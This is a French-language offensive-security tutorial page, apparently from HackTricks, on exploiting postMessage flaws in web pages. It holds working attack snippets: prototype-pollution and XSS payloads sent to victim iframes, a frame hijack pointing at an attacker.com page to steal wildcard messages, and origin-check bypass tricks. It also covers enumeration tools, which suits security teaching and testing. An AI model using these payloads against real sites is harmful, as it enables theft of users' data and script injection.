# PostMessage Vulnerabilities

## PostMessage Vulnerabilities

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}


## Envoyer **PostMessage**

**PostMessage** utilise la fonction suivante pour envoyer un message :
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Notez que **targetOrigin** peut √™tre un '\*' ou une URL comme _https://company.com._\
Dans le **deuxi√®me sc√©nario**, le **message ne peut √™tre envoy√© qu'√† ce domaine** (m√™me si l'origine de l'objet window est diff√©rente).\
Si le **joker** est utilis√©, **les messages peuvent √™tre envoy√©s √† n'importe quel domaine**, et seront envoy√©s √† l'origine de l'objet Window.

### Attaquer iframe & joker dans **targetOrigin**

Comme expliqu√© dans [**ce rapport**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), si vous trouvez une page qui peut √™tre **ifram√©e** (pas de protection `X-Frame-Header`) et qui **envoie des messages sensibles** via **postMessage** en utilisant un **joker** (\*), vous pouvez **modifier** l'**origine** de l'**iframe** et **fuiter** le message **sensible** vers un domaine contr√¥l√© par vous.\
Notez que si la page peut √™tre ifram√©e mais que le **targetOrigin** est **d√©fini sur une URL et non sur un joker**, cette **astuce ne fonctionnera pas**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## exploitation de addEventListener

**`addEventListener`** est la fonction utilis√©e par JS pour d√©clarer la fonction qui **attend des `postMessages`**.\
Un code similaire √† celui-ci sera utilis√© :
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Notez dans ce cas comment la **premi√®re chose** que le code fait est **v√©rifier l'origine**. C'est terriblement **important**, surtout si la page va faire **quoi que ce soit de sensible** avec les informations re√ßues (comme changer un mot de passe). **Si elle ne v√©rifie pas l'origine, les attaquants peuvent faire en sorte que les victimes envoient des donn√©es arbitraires √† ces points de terminaison** et changer les mots de passe des victimes (dans cet exemple).

### √ânum√©ration

Pour **trouver des √©couteurs d'√©v√©nements** sur la page actuelle, vous pouvez :

* **Rechercher** dans le code JS `window.addEventListener` et `$(window).on` (_version JQuery_)
* **Ex√©cuter** dans la console des outils de d√©veloppement : `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **Aller √†** _√âl√©ments --> √âcouteurs d'√©v√©nements_ dans les outils de d√©veloppement du navigateur

![](<../../.gitbook/assets/image (396).png>)

* Utiliser une **extension de navigateur** comme [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ou [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Ces extensions de navigateur vont **intercepter tous les messages** et vous les montrer.

### Contournements de v√©rification d'origine

* L'attribut **`event.isTrusted`** est consid√©r√© comme s√©curis√© car il renvoie `True` uniquement pour les √©v√©nements g√©n√©r√©s par de v√©ritables actions de l'utilisateur. Bien qu'il soit difficile √† contourner s'il est correctement impl√©ment√©, son importance dans les v√©rifications de s√©curit√© est notable.
* L'utilisation de **`indexOf()`** pour la validation d'origine dans les √©v√©nements PostMessage peut √™tre sujette √† contournement. Un exemple illustrant cette vuln√©rabilit√© est :

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* La m√©thode **`search()`** de `String.prototype.search()` est destin√©e aux expressions r√©guli√®res, pas aux cha√Ænes. Passer autre chose qu'une regexp entra√Æne une conversion implicite en regex, rendant la m√©thode potentiellement non s√©curis√©e. Cela est d√ª au fait qu'en regex, un point (.) agit comme un caract√®re g√©n√©rique, permettant de contourner la validation avec des domaines sp√©cialement con√ßus. Par exemple :

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* La fonction **`match()`**, similaire √† `search()`, traite les regex. Si la regex est mal structur√©e, elle pourrait √™tre sujette √† contournement.
* La fonction **`escapeHtml`** est destin√©e √† assainir les entr√©es en √©chappant les caract√®res. Cependant, elle ne cr√©e pas un nouvel objet √©chapp√© mais √©crase les propri√©t√©s de l'objet existant. Ce comportement peut √™tre exploit√©. En particulier, si un objet peut √™tre manipul√© de sorte que sa propri√©t√© contr√¥l√©e ne reconnaisse pas `hasOwnProperty`, l'`escapeHtml` ne fonctionnera pas comme pr√©vu. Cela est d√©montr√© dans les exemples ci-dessous :

* √âchec attendu :

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
* Contournement de l'√©chappement :

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

Dans le contexte de cette vuln√©rabilit√©, l'objet `File` est particuli√®rement exploitable en raison de sa propri√©t√© `name` en lecture seule. Cette propri√©t√©, lorsqu'elle est utilis√©e dans des mod√®les, n'est pas assainie par la fonction `escapeHtml`, ce qui entra√Æne des risques de s√©curit√© potentiels.
* La propri√©t√© `document.domain` en JavaScript peut √™tre d√©finie par un script pour raccourcir le domaine, permettant une application plus souple de la politique de m√™me origine au sein du m√™me domaine parent.

### Contournement de e.origin == window.origin

Lors de l'int√©gration d'une page web dans un **iframe sandbox√©** en utilisant %%%%%%, il est crucial de comprendre que l'origine de l'iframe sera d√©finie sur null. Cela est particuli√®rement important lors de la gestion des **attributs sandbox** et de leurs implications sur la s√©curit√© et la fonctionnalit√©.

En sp√©cifiant **`allow-popups`** dans l'attribut sandbox, toute fen√™tre popup ouverte depuis l'iframe h√©rite des restrictions sandbox de son parent. Cela signifie que, √† moins que l'attribut **`allow-popups-to-escape-sandbox`** ne soit √©galement inclus, l'origine de la fen√™tre popup est √©galement d√©finie sur `null`, s'alignant avec l'origine de l'iframe.

Par cons√©quent, lorsqu'une popup est ouverte dans ces conditions et qu'un message est envoy√© de l'iframe √† la popup en utilisant **`postMessage`**, les deux extr√©mit√©s d'envoi et de r√©ception ont leurs origines d√©finies sur `null`. Cette situation conduit √† un sc√©nario o√π **`e.origin == window.origin`** √©value √† vrai (`null == null`), car √† la fois l'iframe et la popup partagent la m√™me valeur d'origine de `null`.

Pour plus d'informations **lisez** :

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Contournement de e.source

Il est possible de v√©rifier si le message provient de la m√™me fen√™tre dans laquelle le script √©coute (particuli√®rement int√©ressant pour les **Scripts de Contenu des extensions de navigateur** pour v√©rifier si le message a √©t√© envoy√© depuis la m√™me page) :
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Vous pouvez forcer **`e.source`** d'un message √† √™tre nul en cr√©ant un **iframe** qui **envoie** le **postMessage** et qui est **imm√©diatement supprim√©**.

Pour plus d'informations **lisez :**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Contournement de l'en-t√™te X-Frame

Pour effectuer ces attaques, id√©alement, vous pourrez **mettre la page web de la victime** √† l'int√©rieur d'un `iframe`. Mais certains en-t√™tes comme `X-Frame-Header` peuvent **emp√™cher** ce **comportement**.\
Dans ces sc√©narios, vous pouvez toujours utiliser une attaque moins discr√®te. Vous pouvez ouvrir un nouvel onglet vers l'application web vuln√©rable et communiquer avec elle :
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Vol de message envoy√© √† l'enfant en bloquant la page principale

Dans la page suivante, vous pouvez voir comment vous pourriez voler des **donn√©es postmessage sensibles** envoy√©es √† un **iframe enfant** en **bloquant** la **page principale** avant d'envoyer les donn√©es et en abusant d'un **XSS dans l'enfant** pour **fuiter les donn√©es** avant qu'elles ne soient re√ßues :

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Vol de message en modifiant l'emplacement de l'iframe

Si vous pouvez iframe une page web sans X-Frame-Header qui contient un autre iframe, vous pouvez **changer l'emplacement de cet iframe enfant**, donc s'il re√ßoit un **postmessage** envoy√© en utilisant un **wildcard**, un attaquant pourrait **changer** cette **origine** d'iframe √† une page **contr√¥l√©e** par lui et **voler** le message :

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage pour la pollution de prototype et/ou XSS

Dans des sc√©narios o√π les donn√©es envoy√©es via `postMessage` sont ex√©cut√©es par JS, vous pouvez **iframe** la **page** et **exploiter** la **pollution de prototype/XSS** en envoyant l'exploit via `postMessage`.

Quelques **XSS tr√®s bien expliqu√©s via `postMessage`** peuvent √™tre trouv√©s sur [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Exemple d'un exploit pour abuser de la **pollution de prototype et ensuite XSS** via un `postMessage` √† un `iframe` :
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Pour **plus d'informations** :

* Lien vers la page sur [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/)
* Lien vers la page sur [**XSS**](../xss-cross-site-scripting/)
* Lien vers la page sur [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## R√©f√©rences

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Pour pratiquer : [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)


{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* V√©rifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
